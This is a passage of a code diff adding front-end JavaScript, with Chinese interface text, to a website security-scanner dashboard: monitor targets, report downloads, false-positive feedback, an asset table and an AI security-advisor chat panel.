+// ========== Monitor Targets ==========
+function getMonitorTargets() {
+  try { return (function(){try{return JSON.parse(localStorage.getItem('vs_monitors')||'[]');}catch(e){return [];}})(); } catch(e) { return []; }
+}
+
+function saveMonitorTargets(targets) {
+  try { (function(){try{localStorage.setItem('vs_monitors',JSON.stringify(targets));}catch(e){}})(); } catch(e) {}
+}
+
+function addMonitorTarget() {
+  let urlInput = document.getElementById('monitor-url-input');
+  let freqSelect = document.getElementById('monitor-freq-select');
+  let url = urlInput.value.trim();
+  let freq = freqSelect.value;
+  if (!url) { showToast('请输入 URL'); return; }
+  if (!/^https?:\/\//i.test(url)) { url = 'http://' + url; }
+
+  let targets = getMonitorTargets();
+  // 检查是否已存在
+  let exists = targets.some(function(t) { return t.url === url; });
+  if (exists) { showToast('该 URL 已在监控列表中'); return; }
+
+  let newTarget = {
+    url: url,
+    freq: freq,
+    added_at: new Date().toISOString(),
+    last_scan: '-',
+    score: null
+  };
+
+  // 尝试调用后端 API
+  authFetch('/api/targets', {
+    method: 'POST',
+    body: JSON.stringify({ url: url, schedule: freq })
+  }).then(function(resp) { return resp.json(); }).then(function(data) {
+    if (data.id) {
+      newTarget.id = data.id;
+    }
+  }).catch(function() {
+    // 后端不可用时使用本地存储
+  });
+
+  targets.push(newTarget);
+  saveMonitorTargets(targets);
+  urlInput.value = '';
+  renderMonitorTargets();
+  showToast('监控目标已添加');
+}
+
+function removeMonitorTarget(index) {
+  if (!confirm("确定要删除此监控目标吗？")) return;
+  let targets = getMonitorTargets();
+  let target = targets[index];
+  if (target && target.id) {
+    authFetch('/api/targets/' + target.id, { method: 'DELETE' }).catch(function() {});
+  }
+  targets.splice(index, 1);
+  saveMonitorTargets(targets);
+  renderMonitorTargets();
+  showToast('监控目标已删除');
+}
+
+function renderMonitorTargets() {
+  let list = document.getElementById('monitor-target-list');
+  if (!list) return;
+  let targets = getMonitorTargets();
+  if (targets.length === 0) {
+    list.innerHTML = '<div class="monitor-empty">暂无监控目标，请添加需要定期扫描的网站</div>';
+    return;
+  }
+  let freqLabels = { daily: '每天', weekly: '每周', none: '不扫描' };
+  let html = '';
+  targets.forEach(function(t, i) {
+    let scoreColor = t.score !== null ? (t.score >= 75 ? 'var(--success)' : t.score >= 50 ? 'var(--warning)' : 'var(--danger)') : 'var(--text-lighter)';
+    html += '<div class="monitor-item">';
+    html += '<div style="flex:1;min-width:0">';
+    html += '<div class="monitor-item-url">' + escapeHtml(t.url) + '</div>';
+    html += '<div class="monitor-item-meta">' + freqLabels[t.freq] || t.freq + ' &middot; 上次扫描: ' + (t.last_scan || '-') + '</div>';
+    html += '</div>';
+    html += '<div class="monitor-item-score" style="color:' + scoreColor + '">' + (t.score !== null ? t.score : '-') + '</div>';
+    html += '<button class="monitor-item-del" onclick="removeMonitorTarget(' + i + ')"></button>';
+    html += '</div>';
+  });
+  list.innerHTML = html;
+}
+
+// ========== Report Download (PDF + HTML) ==========
+function downloadReport(fmt) {
+  if (!lastScanResult) { showToast('暂无扫描结果'); return; }
+  let format = fmt || 'pdf';
+  let formatName = format === 'html' ? 'HTML' : 'PDF';
+  showToast('正在生成 ' + formatName + ' 报告...');
+
+  function doDownload(scanId) {
+    let url = '/api/report/' + encodeURIComponent(scanId) + '?format=' + format;
+    if (format === 'html') {
+      authFetch(url)
+        .then(function(resp) {
+          if (!resp.ok) throw new Error('报告生成失败 (' + resp.status + ')');
+          return resp.text();
+        })
+        .then(function(html) {
+          let blob = new Blob([html], { type: 'text/html;charset=utf-8' });
+          let blobUrl = URL.createObjectURL(blob);
+          let a = document.createElement('a');
+          a.href = blobUrl;
+          a.download = 'security-report-' + getHost(lastScanResult.url) + '.html';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+          URL.revokeObjectURL(blobUrl);
+          showToast('HTML 报告已下载');
+        })
+        .catch(function(e) {
+          showToast('报告下载失败: ' + e.message);
+        });
+    } else {
+      authFetch(url)
+        .then(function(resp) {
+          if (!resp.ok) throw new Error('PDF 生成失败 (' + resp.status + ')');
+          return resp.blob();
+        })
+        .then(function(blob) {
+          let blobUrl = URL.createObjectURL(blob);
+          let a = document.createElement('a');
+          a.href = blobUrl;
+          a.download = 'security-report-' + getHost(lastScanResult.url) + '.pdf';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+          URL.revokeObjectURL(blobUrl);
+          showToast('PDF 报告已下载');
+        })
+        .catch(function(e) {
+          showToast('PDF 下载失败: ' + e.message);
+        });
+    }
+  }
+
+  let scanId = lastScanResult.scan_id;
+  // 如果 scan_id 不存在或不是数字，尝试从扫描历史取最新一条
+  if (!scanId || isNaN(Number(scanId))) {
+    authFetch('/api/history?limit=1')
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        let item = (data.history || [])[0];
+        if (item && item.id) {
+          doDownload(item.id);
+        } else {
+          showToast('当前结果暂不支持下载');
+        }
+      })
+      .catch(function(e) {
+        showToast('获取扫描记录失败: ' + e.message);
+      });
+  } else {
+    doDownload(scanId);
+  }
+}
+
+// 兼容旧函数名
+function downloadPdfReport() { downloadReport('pdf'); }
+
+// 报告下载下拉菜单
+function toggleReportDropdown() {
+  let menu = document.getElementById('report-dropdown');
+  if (menu) {
+    menu.classList.toggle('show');
+    // 点击外部关闭
+    if (menu.classList.contains('show')) {
+      setTimeout(function() {
+        document.addEventListener('click', closeReportDropdownOutside);
+      }, 0);
+    }
+  }
+}
+function closeReportDropdownOutside(e) {
+  let dropdown = document.querySelector('.report-download-dropdown');
+  let menu = document.getElementById('report-dropdown');
+  if (dropdown && !dropdown.contains(e.target) && menu) {
+    menu.classList.remove('show');
+    document.removeEventListener('click', closeReportDropdownOutside);
+  }
+}
+
+// Navigation
+function navigateTo(page) {
+  try {
+  // scan 没有独立页面，滚动到首页扫描区域
+  if (page === 'scan') {
+    let home = document.getElementById('page-home');
+    if (home) home.classList.add('active');
+    document.querySelectorAll('.page').forEach(function(p) { if (p.id !== 'page-home') p.classList.remove('active'); });
+    let navItem = document.querySelector('.nav-item[data-page="scan"]');
+    if (navItem) navItem.classList.add('active');
+    document.querySelectorAll('.nav-item').forEach(function(n) { if (n.getAttribute('data-page') !== 'scan') n.classList.remove('active'); });
+    let scanSection = document.querySelector('.scan-section');
+    if (scanSection) scanSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    loadDashboard();
+    return;
+  }
+  let target = document.getElementById('page-' + page);
+  if (target) target.classList.add('active');
+  document.querySelectorAll('.page').forEach(function(p) { if (p.id !== 'page-' + page) p.classList.remove('active'); });
+  // 11-S fix: result 页面没有对应导航项，高亮"扫描"按钮
+  let navPage = (page === 'result') ? 'scan' : page;
+  let navItem = document.querySelector('.nav-item[data-page="' + navPage + '"]');
+  if (navItem) navItem.classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(function(n) { if (n.getAttribute('data-page') !== navPage) n.classList.remove('active'); });
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  if (page === 'tickets') loadTickets();
+  if (page === 'assets') loadAssets();
+  if (page === 'evolution') loadEvolution();
+  } catch (e) {
+    console.error('navigateTo error:', e);
+  }
+}
+
+// Toast 队列（最多堆叠 3 条，每条显示 2.5 秒，新消息从底部滑入）
+let _toastQueue = [];
+let _toastActive = 0;
+let _TOAST_MAX = 3;
+let _TOAST_DURATION = 2500;
+
+function showToast(msg, type) {
+  _toastQueue.push({ msg: msg, type: type });
+  _processToastQueue();
+}
+
+function _processToastQueue() {
+  if (_toastActive >= _TOAST_MAX || _toastQueue.length === 0) return;
+  let item = _toastQueue.shift();
+  _toastActive++;
+
+  let container = document.getElementById('toast-container');
+  if (!container) { _toastActive--; return; }
+  let t = document.createElement('div');
+  t.className = 'toast';
+
+  let icon = 'ℹ️';
+  if (item.type === 'error') icon = '[错误]';
+  else if (item.type === 'success') icon = '[成功]';
+  else if (item.type === 'warn') icon = '[警告]';
+  let iconSpan = document.createElement('span');
+  iconSpan.textContent = icon + ' ';
+  iconSpan.style.marginRight = '6px';
+  t.appendChild(iconSpan);
+  t.appendChild(document.createTextNode(item.msg));
+
+  if (item.type === 'error') t.classList.add('error');
+  else if (item.type === 'success') t.classList.add('success');
+
+  container.appendChild(t);
+
+  // 触发重排后添加 show 类，实现滑入动画
+  requestAnimationFrame(function() {
+    requestAnimationFrame(function() {
+      t.classList.add('show');
+    });
+  });
+
+  setTimeout(function() {
+    t.classList.add('hiding');
+    t.classList.remove('show');
+    setTimeout(function() {
+      if (t.parentNode) t.parentNode.removeChild(t);
+      _toastActive--;
+      _processToastQueue();
+    }, 300);
+  }, _TOAST_DURATION);
+}
+
+// ========== 11-S+ finding 误报反馈 ==========
+function submitFindingFeedback(btn, findingName, scanId, isFalsePositive) {
+  if (!findingName) { showToast('finding 名称缺失', 'error'); return; }
+  if (!isLoggedIn()) {
+    showToast('请先登录后再标记误报', 'error');
+    return;
+  }
+  // 防止重复点击
+  if (btn.disabled) return;
+  btn.disabled = true;
+  let originalText = btn.innerHTML;
+  btn.innerHTML = '提交中...';
+
+  let fetchFn = (typeof authFetch === 'function') ? authFetch : fetch;
+  let url = '/api/finding/feedback';
+  let body = JSON.stringify({
+    scan_id: scanId || 0,
+    finding_name: findingName,
+    is_false_positive: !!isFalsePositive,
+    is_confirmed: !isFalsePositive,
+  });
+  let promise = fetchFn(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: body,
+  });
+  Promise.resolve(promise)
+    .then(function(r) { return r.json().then(function(d) { return { ok: r.ok, d: d }; }); })
+    .then(function(res) {
+      if (res.ok && res.d && res.d.success) {
+        // 找到该 finding 详情面板，更新 UI
+        let card = btn.closest('.finding-detail');
+        if (card) {
+          if (isFalsePositive) {
+            card.classList.add('fp-marked');
+            card.classList.remove('confirmed');
+            // 在标题区追加"已被标记为误报"
+            let header = card.querySelector('.finding-detail-header');
+            if (header && !header.querySelector('.fp-badge')) {
+              let badge = document.createElement('span');
+              badge.className = 'fp-badge';
+              badge.textContent = '已被标记为误报';
+              header.appendChild(badge);
+            }
+            // 在反馈行追加说明
+            let row = card.querySelector('.finding-feedback-row');
+            if (row && !row.querySelector('.fp-reason-text')) {
+              let note = document.createElement('span');
+              note.className = 'fp-reason-text';
+              note.textContent = '已标记为误报，将用于优化未来检测';
+              row.appendChild(note);
+            }
+          } else {
+            card.classList.add('confirmed');
+            card.classList.remove('fp-marked');
+            let header2 = card.querySelector('.finding-detail-header');
+            if (header2 && !header2.querySelector('.confirmed-badge')) {
+              let badge2 = document.createElement('span');
+              badge2.className = 'confirmed-badge';
+              badge2.textContent = '已确认';
+              header2.appendChild(badge2);
+            }
+            let row2 = card.querySelector('.finding-feedback-row');
+            if (row2 && !row2.querySelector('.fp-reason-text')) {
+              let note2 = document.createElement('span');
+              note2.className = 'fp-reason-text';
+              note2.style.color = '#73c990';
+              note2.textContent = '已确认为真实漏洞，感谢您的反馈';
+              row2.appendChild(note2);
+            }
+          }
+        }
+        // 禁用两个按钮
+        let btns = (card || document).querySelectorAll('.finding-feedback-row .finding-feedback-btn');
+        btns.forEach(function(b) { b.disabled = true; b.textContent = b.classList.contains('btn-confirm') ? '准确' : '误报'; });
+        showToast(isFalsePositive ? '已记录为误报，感谢反馈！' : '已确认为真实漏洞，感谢反馈！', 'success');
+      } else {
+        btn.disabled = false;
+        btn.innerHTML = originalText;
+        showToast('提交失败: ' + ((res.d && (res.d.error || res.d.detail)) || '未知错误'), 'error');
+      }
+    })
+    .catch(function(e) {
+      btn.disabled = false;
+      btn.innerHTML = originalText;
+      showToast('提交失败: ' + e.message, 'error');
+    });
+}
+
+function loadFindingFeedbackForScan(scanId) {
+  if (!scanId) return;
+  if (!isLoggedIn()) return;
+  let fetchFn = (typeof authFetch === 'function') ? authFetch : fetch;
+  Promise.resolve(fetchFn('/api/finding/feedback?scan_id=' + encodeURIComponent(scanId), { method: 'GET' }))
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      if (d && d.success && d.feedbacks && d.feedbacks.length) {
+        d.feedbacks.forEach(function(fb) {
+          let card = document.querySelector('.finding-detail[data-finding-name="' + cssEscape(fb.finding_name) + '"]');
+          if (!card) return;
+          if (fb.is_false_positive) {
+            card.classList.add('fp-marked');
+          } else if (fb.is_confirmed) {
+            card.classList.add('confirmed');
+          }
+        });
+      }
+    })
+    .catch(function() {});
+}
+
+function cssEscape(s) {
+  if (window.CSS && window.CSS.escape) return window.CSS.escape(s);
+  return String(s).replace(/[^a-zA-Z0-9_-]/g, function(c) { return '\\' + c; });
+}
+
+// ========== Assets ==========
+let allAssets = [];
+
+function loadAssets() {
+  if (!isLoggedIn()) {
+    safeSetHtml('asset-list', '');
+    safeSetDisplay('asset-empty', 'block');
+    let empty = document.getElementById('asset-empty');
+    if (empty) empty.innerHTML = '<div class="ticket-empty-icon">-</div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>';
+    return;
+  }
+  authFetch('/api/assets').then(function(r) { return r.json(); }).then(function(data) {
+    if (data && data.assets) {
+      allAssets = data.assets;
+      renderAssets(allAssets);
+    } else {
+      allAssets = [];
+      renderAssets(allAssets);
+    }
+  }).catch(function(e) {
+    showToast('加载资产失败: ' + e.message, 'error');
+    allAssets = [];
+    renderAssets(allAssets);
+  });
+}
+
+function renderAssets(assets) {
+  let list = document.getElementById('asset-list');
+  let empty = document.getElementById('asset-empty');
+  if (!list) return;
+  if (!assets || assets.length === 0) {
+    list.innerHTML = '';
+    if (empty) {
+      empty.style.display = 'block';
+      empty.innerHTML = '<div class="ticket-empty-icon">-</div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>';
+    }
+    return;
+  }
+  if (empty) empty.style.display = 'none';
+
+  let html = '<div class="asset-table-wrap"><table class="asset-table">';
+  html += '<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>';
+  assets.forEach(function(a) {
+    let verified = a.verified || false;
+    let badgeClass = verified ? 'verified' : 'pending';
+    let badgeText = verified ? '已验证' : '待验证';
+    let score = a.score;
+    let scoreClass = 'high';
+    if (score === null || score === undefined) {
+      score = '-';
+      scoreClass = '';
+    } else if (score < 50) {
+      scoreClass = 'low';
+    } else if (score < 75) {
+      scoreClass = 'medium';
+    }
+    html += '<tr>';
+    html += '<td data-label="域名"><div class="asset-domain">' + escapeHtml(a.domain || '') + '</div><div class="asset-meta">' + escapeHtml(a.description || '') + '</div></td>';
+    html += '<td data-label="负责人">' + escapeHtml(a.owner || '-') + '</td>';
+    html += '<td data-label="验证状态"><span class="asset-badge ' + badgeClass + '">' + badgeText + '</span></td>';
+    html += '<td data-label="评分"><div class="asset-score ' + scoreClass + '">' + score + '</div></td>';
+    html += '<td data-label="操作"><div class="asset-actions">';
+    html += '<button class="asset-btn primary" onclick="scanAsset(' + a.id + ', \'' + escapeAttr(a.domain || '') + '\')">扫描</button>';
+    html += '<button class="asset-btn secondary" onclick="editAsset(' + a.id + ')">编辑</button>';
+    html += '<button class="asset-btn danger" onclick="deleteAsset(' + a.id + ')">删除</button>';
+    html += '</div></td>';
+    html += '</tr>';
+  });
+  html += '</tbody></table></div>';
+  list.innerHTML = html;
+}
+
+function loadEvolution() {
+  if (!isLoggedIn()) {
+    let c = document.getElementById('evolution-content');
+    if (c) c.innerHTML = '<div class="ticket-empty"><div class="ticket-empty-icon">-</div><p>请先登录</p><p class="ticket-empty-hint">登录后使用智能学习、主动监控、团队协作与 AI 顾问</p></div>';
+    return;
+  }
+  let c = document.getElementById('evolution-content');
+  if (c) c.innerHTML = '<div class="loading">加载中...</div>';
+  authFetch('/api/evolution/dashboard').then(function(r) { return r.json(); }).then(function(data) {
+    if (data && data.success) {
+      renderEvolution(data);
+    } else {
+      if (c) c.innerHTML = '<div class="ticket-empty"><div class="ticket-empty-icon">-</div><p>暂未登录或无数据</p></div>';
+    }
+  }).catch(function(e) {
+    if (c) c.innerHTML = '<div class="ticket-empty"><div class="ticket-empty-icon">-</div><p>加载失败: ' + escapeHtml(e.message) + '</p></div>';
+  });
+}
+
+function renderEvolution(d) {
+  let c = document.getElementById('evolution-content');
+  if (!c) return;
+  let score = Math.round(d.evolution_score || 0);
+  let learning = d.learning || {};
+  let monitoring = d.monitoring || {};
+  let team = d.team || {};
+  let trend = learning.trend || [];
+  let persistent = learning.persistent_issues || [];
+  let recs = learning.recommendations || [];
+  let predicted = learning.predicted_next_score;
+
+  let scoreColor = score >= 80 ? '#73c990' : (score >= 50 ? '#f0a732' : '#c75450');
+  let html = '';
+
+  // 顶部进化分数
+  html += '<div class="evo-score-card">';
+  html += '  <div class="evo-score-label">进化指数</div>';
+  html += '  <div class="evo-score-value" style="color:' + scoreColor + '">' + score + '</div>';
+  html += '  <div class="evo-score-bar"><div class="evo-score-fill" style="width:' + score + '%;background:' + scoreColor + '"></div></div>';
+  html += '  <div class="evo-score-hint">基于历史扫描、监控告警与团队协作综合计算</div>';
+  html += '</div>';
+
+  // 4 个模块卡片
+  html += '<div class="evo-grid">';
+  html += evoCard('智能学习', '', '#4b6eaf', [
+    { k: '总扫描次数', v: learning.total_scans || 0 },
+    { k: '平均分', v: learning.avg_score || '-' },
+    { k: '最高分', v: learning.best_score || '-' },
+    { k: '预测下次', v: predicted || '-' }
+  ], () => showEvolutionDetail('learning'));
+  html += evoCard('主动监控', '', '#c75450', [
+    { k: '监控项', v: monitoring.monitors_count || 0 },
+    { k: '未读告警', v: monitoring.unread_alerts || 0 },
+    { k: '状态', v: monitoring.monitors_count ? '运行中' : '未启用' }
+  ], () => showEvolutionDetail('monitoring'));
+  html += evoCard('AI 顾问', '', '#4b6eaf', [
+    { k: '会话记忆', v: '已启用' },
+    { k: '建议数', v: recs.length },
+    { k: '响应', v: '实时' }
+  ], () => showEvolutionDetail('ai'));
+  html += evoCard('团队协作', '', '#73c990', [
+    { k: '加入团队', v: team.teams_count || 0 },
+    { k: '评论', v: '可发起' },
+    { k: '状态', v: team.teams_count ? '已加入' : '未加入' }
+  ], () => showEvolutionDetail('team'));
+  html += '</div>';
+
+  // 趋势 + 持续问题 + 建议
+  html += '<div class="evo-row">';
+  html += '  <div class="evo-panel">';
+  html += '    <div class="evo-panel-title">评分趋势</div>';
+  if (trend.length === 0) {
+    html += '    <div class="evo-empty">暂无历史评分，先做一次扫描</div>';
+  } else {
+    html += '    <div class="evo-trend">';
+    trend.forEach(function(t) {
+      html += '<div class="evo-trend-item"><div class="evo-trend-score">' + t.score + '</div><div class="evo-trend-date">' + escapeHtml(t.date || '') + '</div></div>';
+    });
+    html += '    </div>';
+  }
+  html += '  </div>';
+
+  html += '  <div class="evo-panel">';
+  html += '    <div class="evo-panel-title">持续问题</div>';
+  if (persistent.length === 0) {
+    html += '    <div class="evo-empty">暂无持续性问题</div>';
+  } else {
+    html += '    <ul class="evo-list">';
+    persistent.forEach(function(p) {
+      if (typeof p === 'string') {
+        html += '<li>' + escapeHtml(p) + '</li>';
+      } else if (p && typeof p === 'object') {
+        let label = p.name || p.title || p.issue || JSON.stringify(p);
+        let times = p.times ? ' <span class="evo-empty">×' + p.times + '</span>' : '';
+        let sev = p.severity ? ' <span class="evo-alert-time">[' + escapeHtml(p.severity) + ']</span>' : '';
+        html += '<li>' + escapeHtml(label) + times + sev + '</li>';
+      } else {
+        html += '<li>' + escapeHtml(String(p)) + '</li>';
+      }
+    });
+    html += '    </ul>';
+  }
+  html += '  </div>';
+  html += '</div>';
+
+  html += '<div class="evo-panel">';
+  html += '  <div class="evo-panel-title">个性化建议</div>';
+  if (recs.length === 0) {
+    html += '  <div class="evo-empty">完成更多扫描后，系统会给出更精准的建议</div>';
+  } else {
+    html += '  <ul class="evo-recs">';
+    recs.forEach(function(r) { html += '<li>' + escapeHtml(r) + '</li>'; });
+    html += '  </ul>';
+  }
+  html += '</div>';
+
+  // 监控告警列表
+  if (monitoring.alerts && monitoring.alerts.length > 0) {
+    html += '<div class="evo-panel">';
+    html += '  <div class="evo-panel-title">最新告警</div>';
+    html += '  <ul class="evo-alerts">';
+    monitoring.alerts.slice(0, 5).forEach(function(a) {
+      html += '<li><span class="evo-alert-time">' + escapeHtml(a.created_at || '') + '</span> - ' + escapeHtml(a.message || '') + '</li>';
+    });
+    html += '  </ul>';
+    html += '</div>';
+  }
+
+  c.innerHTML = html;
+}
+
+function evoCard(title, icon, color, items, onClick) {
+  let html = '<div class="evo-card" style="border-top:2px solid ' + color + '" onclick="(' + onClick.toString() + ')()">';
+  html += '  <div class="evo-card-head"><span class="evo-card-icon" style="background:#313335;color:' + color + '">' + icon + '</span><span class="evo-card-title">' + title + '</span></div>';
+  html += '  <div class="evo-card-items">';
+  items.forEach(function(it) {
+    html += '<div class="evo-card-item"><div class="evo-card-k">' + escapeHtml(it.k) + '</div><div class="evo-card-v">' + escapeHtml(String(it.v)) + '</div></div>';
+  });
+  html += '  </div>';
+  html += '</div>';
+  return html;
+}
+
+function showEvolutionDetail(name) {
+  let html = '';
+  if (name === 'monitoring') {
+    html = '<div class="evo-detail">';
+    html += '  <div class="evo-detail-title">添加监控</div>';
+    html += '  <div class="evo-detail-form">';
+    html += '    <input id="mon-url" class="evo-input" placeholder="https://example.com" />';
+    html += '    <input id="mon-freq" class="evo-input" type="number" min="60" value="3600" placeholder="检查频率(秒)" />';
+    html += '    <button class="evo-btn" onclick="createMonitor()">创建监控</button>';
+    html += '  </div>';
+    html += '  <div id="evo-mon-list"></div>';
+    html += '</div>';
+    showToast('提示:在弹窗中可创建监控', 'info');
+  } else if (name === 'ai') {
+    html = '<div class="ai-chat-wrap">';
+    // 顶部状态条：显示是否真 LLM
+    html += '  <div class="ai-status-bar" id="ai-status-bar"><span class="ai-status-dot pending"></span><span class="ai-status-text">检测中...</span></div>';
+    // 快捷问题
+    html += '  <div class="ai-quick">';
+    html += '    <button class="ai-quick-btn" onclick="aiSend(\'我的网站最近有什么风险?\')">我的风险</button>';
+    html += '    <button class="ai-quick-btn" onclick="aiSend(\'怎么修 HSTS 缺失?\')">修 HSTS</button>';
+    html += '    <button class="ai-quick-btn" onclick="aiSend(\'我应该先修哪个问题?\')">优先级</button>';
+    html += '    <button class="ai-quick-btn" onclick="aiSend(\'解释一下 CSP 是什么\')">CSP 解释</button>';
+    html += '  </div>';
+    // 消息列表
+    html += '  <div id="evo-ai-msgs" class="ai-msgs">';
+    html += '    <div class="ai-msg bot">';
+    html += '      <div class="ai-msg-avatar">AI</div>';
+    html += '      <div class="ai-msg-body">';
+    html += '        <div class="ai-msg-name">漏洞哨兵 AI 顾问</div>';
+    html += '        <div class="ai-msg-content">你好！我是漏洞哨兵 11-S 的 AI 安全顾问。<br><br>我可以帮你：<br>• 分析扫描报告与漏洞优先级<br>• 给出可执行的安全修复步骤<br>• 解释安全概念与配置示例<br>• 基于你的历史给出个性化建议<br><br>试试上面的快捷问题，或直接输入你的问题~</div>';
+    html += '      </div>';
+    html += '    </div>';
+    html += '  </div>';
+    // 输入区
+    html += '  <div class="ai-input-bar">';
+    html += '    <textarea id="evo-ai-q" class="ai-input" rows="1" placeholder="问点什么…(Shift+Enter 换行)"></textarea>';
+    html += '    <button class="ai-send-btn" id="ai-send-btn" onclick="aiAsk()">发送</button>';
+    html += '  </div>';
+    html += '</div>';
+    // 加载状态 + 绑定 Enter 发送
+    setTimeout(function(){
+      loadAiStatus();
+      let ta = document.getElementById('evo-ai-q');
+      if (ta) {
+        ta.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter' && !e.shiftKey) {
+            e.preventDefault();
+            aiAsk();
+          }
+        });
+        // 自动撑高
+        ta.addEventListener('input', function() {
+          this.style.height = 'auto';
+          this.style.height = Math.min(this.scrollHeight, 120) + 'px';
+        });
+      }
+    }, 100);
+  } else if (name === 'team') {
+    html = '<div class="evo-detail">';
+    html += '  <div class="evo-detail-title">团队协作</div>';
+    html += '  <div class="evo-detail-form">';
+    html += '    <input id="team-name" class="evo-input" placeholder="团队名称" />';
+    html += '    <button class="evo-btn" onclick="createTeam()">创建团队</button>';
+    html += '  </div>';
+    html += '  <div id="evo-team-list"></div>';
+    html += '</div>';
+  } else if (name === 'learning') {
+    html = '<div class="evo-detail">';
+    html += '  <div class="evo-detail-title">智能学习洞察</div>';
+    html += '  <div class="evo-empty">系统会基于您的历史扫描自动归纳模式、预测风险与生成建议</div>';
+    html += '</div>';
+  }
+  let c = document.getElementById('evolution-content');
+  let detail = document.createElement('div');
+  detail.className = 'evo-modal-bg';
+  detail.innerHTML = '<div class="evo-modal"><div class="evo-modal-close" onclick="this.parentNode.parentNode.remove()">&times;</div>' + html + '</div>';
+  c.appendChild(detail);
+}
+
+function createMonitor() {
+  let url = document.getElementById('mon-url').value.trim();
+  let freq = parseInt(document.getElementById('mon-freq').value) || 3600;
+  if (!url) { showToast('请输入 URL', 'error'); return; }
+  authFetch('/api/monitors', { method: 'POST', body: JSON.stringify({ url: url, frequency: freq }) })
+    .then(function(r) { return r.json(); }).then(function(data) {
+      if (data.id || data.monitor_id) { showToast('监控已创建', 'success'); loadEvolution(); }
+      else { showToast('创建失败', 'error'); }
+    }).catch(function(e) { showToast('创建失败: ' + e.message, 'error'); });
+}
+
+function aiAsk() {
+  let input = document.getElementById('evo-ai-q');
+  if (!input) return;
+  let q = input.value.trim();
+  if (!q) return;
+  aiSend(q);
+}
+
+let _aiSending = false;
+function aiSend(q) {
+  if (_aiSending) return;
+  let input = document.getElementById('evo-ai-q');
+  let msgs = document.getElementById('evo-ai-msgs');
+  let sendBtn = document.getElementById('ai-send-btn');
+  if (!msgs) return;
+  _aiSending = true;
+
+  // 用户消息
+  msgs.innerHTML +=
+    '<div class="ai-msg user">' +
+    '  <div class="ai-msg-avatar user">我</div>' +
+    '  <div class="ai-msg-body">' +
+    '    <div class="ai-msg-content">' + escapeHtml(q) + '</div>' +
+    '  </div>' +
+    '</div>';
+  if (input) input.value = '';
+  if (sendBtn) { sendBtn.disabled = true; sendBtn.textContent = '思考中…'; }
+
+  // "正在输入" 提示
+  let typingId = 'typing-' + Date.now();
+  msgs.innerHTML +=
+    '<div class="ai-msg bot" id="' + typingId + '">' +
+    '  <div class="ai-msg-avatar">AI</div>' +
+    '  <div class="ai-msg-body"><div class="ai-msg-content"><span class="ai-typing">...</span></div></div>' +
+    '</div>';
+  msgs.scrollTop = msgs.scrollHeight;
+
+  authFetch('/api/ai/chat', { method: 'POST', body: JSON.stringify({ message: q }) })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      let typing = document.getElementById(typingId);
+      if (typing) typing.remove();
+      let ans = (data && data.response) || (data && data.reply) || (data && data.message) || JSON.stringify(data);
+      let providerBadge = '';
+      if (data && data.llm_used) {
+        let prov = (data.llm_provider || 'LLM').toUpperCase();
+        providerBadge = '<span class="ai-tag real">真 ' + escapeHtml(prov) + '</span>';
+      } else {
+        providerBadge = '<span class="ai-tag local">本地规则</span>';
+      }
+      msgs.innerHTML +=
+        '<div class="ai-msg bot">' +
+        '  <div class="ai-msg-avatar">AI</div>' +
+        '  <div class="ai-msg-body">' +
+        '    <div class="ai-msg-name">漏洞哨兵 AI 顾问 ' + providerBadge + '</div>' +
+        '    <div class="ai-msg-content">' + renderAiMarkdown(ans) + '</div>' +
+        '  </div>' +
+        '</div>';
+      msgs.scrollTop = msgs.scrollHeight;
+    })
+    .catch(function(e) {
+      let typing = document.getElementById(typingId);
+      if (typing) typing.remove();
+      msgs.innerHTML +=
+        '<div class="ai-msg bot">' +
+        '  <div class="ai-msg-avatar">AI</div>' +
+        '  <div class="ai-msg-body"><div class="ai-msg-content">️ 请求失败: ' + escapeHtml(e.message) + '</div></div>' +
+        '</div>';
+    })
+    .finally(function() {
+      _aiSending = false;
+      if (sendBtn) { sendBtn.disabled = false; sendBtn.textContent = '发送'; }
+    });
+}
+
+function loadAiStatus() {
+  let bar = document.getElementById('ai-status-bar');
+  if (!bar) return;
+  fetch('/api/ai/status').then(function(r) { return r.json(); }).then(function(d) {
+    if (!d || !d.success) return;
+    if (d.llm_enabled && d.api_key_configured) {
+      bar.innerHTML = '<span class="ai-status-dot ok"></span><span class="ai-status-text">已连接真实 LLM · ' +
+        escapeHtml(d.provider) + ' / ' + escapeHtml(d.model) + '</span>';
+    } else {
+      bar.innerHTML = '<span class="ai-status-dot local"></span><span class="ai-status-text">本地规则模式（未配置 LLM Key）</span>';
+    }
+  }).catch(function() {
+    bar.innerHTML = '<span class="ai-status-dot err"></span><span class="ai-status-text">无法获取 AI 状态</span>';
+  });
+}
+
+// 极简 Markdown 渲染：换行/代码块/行内代码/加粗
+function renderAiMarkdown(s) {
+  if (!s) return '';
+  let parts = String(s).split(/```/);
+  let out = [];
+  for (let i = 0; i < parts.length; i++) {
+    if (i % 2 === 1) {
+      // 代码块
+      out.push('<pre class="ai-code"><code>' + escapeHtml(parts[i]) + '</code></pre>');
+    } else {
+      let t = escapeHtml(parts[i]);
+      // 行内代码 `xx`
+      t = t.replace(/`([^`\n]+)`/g, '<code class="ai-code-inline">$1</code>');
+      // 加粗 **xx**
+      t = t.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+      // 按空行分段，段内把单换行合并为空格（解决短句竖排问题）
+      let paras = t.split(/\n\n+/);
+      paras.forEach(function(para) {
+        let line = para.replace(/\n/g, ' ').trim();
+        if (line) out.push('<p>' + line + '</p>');
+      });
+    }
+  }
+  return out.join('');
+}
+
+function createTeam() {
+  let name = document.getElementById('team-name').value.trim();
+  if (!name) { showToast('请输入团队名', 'error'); return; }
+  authFetch('/api/teams', { method: 'POST', body: JSON.stringify({ name: name }) })
+    .then(function(r) { return r.json(); }).then(function(data) {
+      if (data.id || data.team_id) { showToast('团队已创建', 'success'); loadEvolution(); }
